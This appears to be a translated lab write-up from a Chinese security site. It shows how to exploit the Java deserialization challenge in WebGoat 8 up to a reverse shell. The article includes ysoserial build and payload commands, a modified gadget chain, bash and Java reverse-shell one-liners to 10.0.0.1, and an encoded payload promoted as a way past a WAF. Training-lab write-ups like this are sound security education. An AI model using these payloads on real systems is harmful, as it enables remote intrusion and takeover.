***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

##  前言

**Java反序列化漏洞可以说是Java安全的一块心病，近年来更是在安全界“出尽风头”。其实说到Java反序列化的问题，早在2015年年初的在AppSecCali大会上，两名安全研究人员[Chris
Frohoff](https://twitter.com/frohoff) 和 [Gabriel
Lawrence](https://twitter.com/gebl)发表了一篇题为《Marshalling
Pickles》的报告，就详细描述了Java反序列化漏洞可以利用Apache Commons
Collections这个常用的Java库来实现任意代码执行，甚至还提供了相应的Payload生成工具[ysoserial](https://github.com/frohoff/ysoserial)。**

通过对象序列化，开发人员可将内存中对象转换为二进制和文本数据格式进行存储或传输。但是，从不受信任的数据反序列化对象可能会导致攻击者实现远程代码执行。

本文我将以WebGoat 8中的反序列化挑战（部署在Docker上）为例，向大家展示完成该挑战并进一步获取目标反向shell的完整过程。

## 漏洞发现

正如挑战中所提到的，易受攻击的页面从用户输入中获取Base64格式的序列化Java对象，并不加过滤的对其进行反序列化操作。我们将通过提供一个序列化对象来利用这个漏洞，该对象将触发面向属性的编程链（POP链）以在反序列化期间实现远程命令执行。

![漏洞发现](https://image.3001.net/images/20181106/1541462212_5be0d8c48be29.png!small)

启动Burp并安装一个名为[Java-Deserialization-Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)的插件。该插件主要包括2个功能：扫描以及基于ysoserial生成exploit。

![扫描以及基于ysoserial生成exploit](https://image.3001.net/images/20181106/1541462243_5be0d8e3a04e3.png!small)

扫描远程端点后，Burp插件将向我们返回以下报告内容：

    
    
    Hibernate 5 (Sleep): Potentially VULNERABLE!!!

是个好消息！

## 漏洞利用

现在，让我们继续下一步操作。点击exploitation选项卡以实现任意命令执行。

![漏洞利用](https://image.3001.net/images/20181106/1541462266_5be0d8fa863db.png!small)

从提示信息来看，这个错误应该来自ysoserial。我们回到控制台看看究竟是什么问题。

![漏洞利用](https://image.3001.net/images/20181106/1541462277_5be0d9058643f.png!small)

通过观察ysoserial，我看到有两种不同的POP链可用于Hibernate。但使用这些payload后，我发现它们都没有在目标系统上成功执行。

![没有在目标系统上成功执行](https://image.3001.net/images/20181106/1541462296_5be0d918cd330.png!small)

那么，插件又是如何生成payload来触发sleep命令的呢？

我决定查看插件的源码：

> <https://github.com/federicodotta/Java-Deserialization-> Scanner/blob/master/src/burp/BurpExtender.java>

经过一番仔细查看，我发现原来payload在插件的源码中是硬编码的。因此，我们需要找到一种方法来生成相同的payload以使其正常工作。

![生成相同的payload](https://image.3001.net/images/20181106/1541462319_5be0d92f12bc8.png!small)

基于一些研究和帮助我发现，通过修改当前版本的ysoserial可以使我们的payload正常工作。我下载了ysoserial的源码，并决定使用Hibernate
5重新对其进行编译。想要使用Hibernate
5成功构建ysoserial，我们还需要将javax.el包添加到[pom.xml](https://mvnrepository.com/artifact/javax.el/javax.el-api/3.0.0)文件中。

此外，我还向原始项目发送了一个[Pull请求](https://github.com/frohoff/ysoserial/pull/98)，以便在选择hibernate5配置文件时修复构建。

![修复构建](https://image.3001.net/images/20181106/1541462355_5be0d95377f5e.png!small)

现在，我们就可以使用以下命令开始重新构建ysoserial了：

    
    
    mvn clean package -DskipTests -Dhibernate5

然后，我们使用以下命令来生成payload：

    
    
    java -Dhibernate5 -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/test" | base64 -w0

![生成payload](https://image.3001.net/images/20181106/1541462369_5be0d961df87f.png!small)

我们可以通过以下命令访问docker容器，来验证我们的命令是否已成功执行：

    
    
    docker exec -it <CONTAINER_ID> /bin/bash

可以看到我们的payload已在目标机器上成功执行了！

![成功执行](https://image.3001.net/images/20181106/1541462392_5be0d97891a76.png!small)

我们继续枚举目标机器上的二进制文件。

    
    
    webgoat@1d142ccc69ec:/$ which php
    webgoat@1d142ccc69ec:/$ which python
    webgoat@1d142ccc69ec:/$ which python3
    webgoat@1d142ccc69ec:/$ which wget
    webgoat@1d142ccc69ec:/$ which curl
    webgoat@1d142ccc69ec:/$ which nc
    webgoat@1d142ccc69ec:/$ which perl
    /usr/bin/perl
    webgoat@1d142ccc69ec:/$ which bash
    /bin/bash
    webgoat@1d142ccc69ec:/$

只有Perl和Bash可用。让我们尝试生成一个可向我们发送反向shell的payload。

以下是Pentest Monkeys上的一些单行反向shell：

> <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

我决定尝试Bash反向shell：

    
    
    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

但你可能知道java.lang.Runtime.exec()具有一定的局限性，它不支持重定向或管道等shell操作符。

让我们试试Java编写的反向shell。我将修改Gadgets.java上的源码，来生成反向shell payload。

以下是我们需要修改的路径：

    
    
    /root/ysoserial/src/main/java/ysoserial/payloads/util/Gadgets.java

从第116到118行。

下面是Pentest Monkeys上提到的一个Java反向shell，但依然无法正常工作：

    
    
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&amp5 done"] as String[])
    p.waitFor()

在进行了一番修改后，结果如下：

    
    
    String cmd = "java.lang.Runtime.getRuntime().exec(new String []{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5 | while read line; do \\$line 2>&5 >&amp5 done\"}).waitFor();";
    clazz.makeClassInitializer().insertAfter(cmd);

让我们再次重建ysoserial，并测试生成的payload。

![生成的payload](https://image.3001.net/images/20181106/1541462443_5be0d9ab870b1.png!small)

可以看到，这次我们成功获取到了一个反向shell！

![11_7Us7ZKFs2LH2dlnbo8mGCQ.png](https://image.3001.net/images/20181106/1541462454_5be0d9b6d41d8.png!small)

太棒了！

![太棒了！](https://image.3001.net/images/20181106/1541462481_5be0d9d12554d.jpg!small)

## Payload生成过程概述

在研究过程中，我们发现了这个编码器，它也可以帮助我们完成这个任务：

> <http://jackson.thuraisamy.me/runtime-exec-payloads.html>

通过以下Bash反向shell命令：

    
    
    bash -i >& /dev/tcp/[IP address]/[port] 0>&1

将会为我们生成如下payload：

    
    
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzgwODAgMD4mMQ==}|{base64,-d}|{bash,-i}

另外，该编码器还可用于绕过WAF哦！不信你就试试~

## 参考文献

> 1、<https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/>
>
> 2、<http://www.pwntester.com/blog/2013/12/16/cve-2011-2894-deserialization-> spring-rce/>
>
> 3、<https://github.com/frohoff/ysoserial>
>
> 4、<https://github.com/federicodotta/Java-Deserialization-Scanner>

 ***参考来源：[medium](https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef)，FB小编secist编译，转载请注明来自FreeBuf.COM**

